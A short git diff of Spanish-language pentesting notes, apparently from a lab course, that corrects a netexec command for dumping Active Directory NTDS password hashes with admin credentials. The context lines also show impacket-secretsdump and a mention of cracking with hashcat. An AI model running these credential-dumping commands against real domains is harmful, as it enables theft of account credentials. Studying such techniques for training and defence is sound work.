@@ -50,7 +50,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ### Ataque NTDS (Opcion 2)
 Directamente con netexec, teniendo credenciales y permisos de administrador obtenemos los hashes directamente:
 ```bash
-netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutilv
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 ```
 
 Ya solo faltaría descifrar con hashcat
